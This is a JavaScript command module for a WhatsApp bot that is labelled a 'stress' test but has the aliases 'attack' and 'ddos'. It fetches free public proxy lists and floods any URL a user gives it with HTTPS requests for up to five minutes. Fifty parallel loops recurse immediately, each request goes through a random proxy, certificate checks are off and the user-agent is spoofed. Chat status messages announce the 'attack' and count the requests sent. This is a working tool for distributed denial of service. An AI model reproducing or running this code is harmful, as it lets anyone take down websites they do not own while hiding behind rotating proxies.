import axios from 'axios';
import { HttpsProxyAgent } from 'https-proxy-agent';
import https from 'https';

const proxySources = [
    'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt'
];

let globalProxies = [];

// Función para cargar proxies (se puede llamar una vez al iniciar o cada X tiempo)
async function updateProxies() {
    let newProxies = [];
    for (const url of proxySources) {
        try {
            const res = await axios.get(url, { timeout: 5000 });
            const lines = res.data.split('\n').map(l => l.trim()).filter(l => l.length > 0);
            newProxies = [...new Set([...newProxies, ...lines])];
        } catch (e) { /* ignore source errors */ }
    }
    globalProxies = newProxies;
    return globalProxies.length;
}

export default {
    command: 'stress',
    aliases: ['attack', 'ddos'],
    category: 'admin', // Sugerencia: Solo para ti
    description: 'Prueba de carga mediante túneles proxy.',
    usage: '.stress <url> <segundos>',

    async run({ m, reply, args, react }) {
        // 1. Validaciones iniciales
        const targetUrl = args[0];
        const duration = parseInt(args[1]) || 60; // 60s por defecto

        if (!targetUrl || !targetUrl.startsWith('http')) {
            return reply('❌ Provee una URL válida. Ejemplo: `.stress https://google.com 60`');
        }

        if (duration > 300) return reply('❌ El tiempo máximo es de 300 segundos.');

        await react('⏳');
        
        // 2. Cargar Proxies si la lista está vacía
        if (globalProxies.length === 0) {
            await reply('🔄 Cargando lista de proxies frescos...');
            await updateProxies();
        }

        if (globalProxies.length === 0) return reply('❌ No se pudieron obtener proxies.');

        // 3. Variables de estado
        let sent = 0;
        let errors = 0;
        const startTime = Date.now();
        const timeout = startTime + (duration * 1000);
        let isActive = true;

        // Enviar mensaje inicial que se irá editando
        const { key } = await reply(`🚀 *Ataque Iniciado*\n\n🎯 *Target:* ${targetUrl}\n⌛ *Duración:* ${duration}s\n📉 *Enviados:* 0\n❌ *Errores:* 0`);

        // 4. Lógica de ataque (Inundación)
        const runTask = () => {
            if (Date.now() > timeout || !isActive) return;

            const proxy = globalProxies[Math.floor(Math.random() * globalProxies.length)];
            const agent = new HttpsProxyAgent(`http://${proxy}`);
            agent.rejectUnauthorized = false;

            const options = {
                method: 'GET',
                agent,
                timeout: 5000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
            };

            const req = https.get(targetUrl, options, (res) => {
                sent++;
                res.on('data', () => {}); // Consumir data para liberar memoria
            });

            req.on('error', () => { errors++; });
            req.end();

            // Recursión inmediata para máxima velocidad
            setImmediate(runTask);
        };

        // Lanzar múltiples hilos paralelos (Workers simulados)
        for (let i = 0; i < 50; i++) runTask();

        // 5. Intervalo de actualización del mensaje en WhatsApp
        const updateInterval = setInterval(async () => {
            const timeLeft = Math.max(0, Math.round((timeout - Date.now()) / 1000));
            
            const statusText = [
                '🔥 *Estado del Ataque* 🔥',
                '',
                `🎯 *Target:* ${targetUrl}`,
                `⏱️ *Tiempo restante:* ${timeLeft}s`,
                `🚀 *Peticiones:* ${sent}`,
                `❌ *Fallos:* ${errors}`,
                '',
                `📡 *Proxies activos:* ${globalProxies.length}`
            ].join('\n');

            // Editar el mensaje original (si tu librería soporta edit)
            // En Baileys suele ser: conn.sendMessage(m.chat, { text: statusText, edit: key })
            await reply(statusText, { edit: key });

            if (Date.now() > timeout) {
                isActive = false;
                clearInterval(updateInterval);
                await reply(`✅ *Prueba Finalizada*\nTotal peticiones: ${sent}`, { edit: key });
                await react('✔');
            }
        }, 4000); // Actualizar cada 4 segundos para no banear el número por spam de edición
    }
};
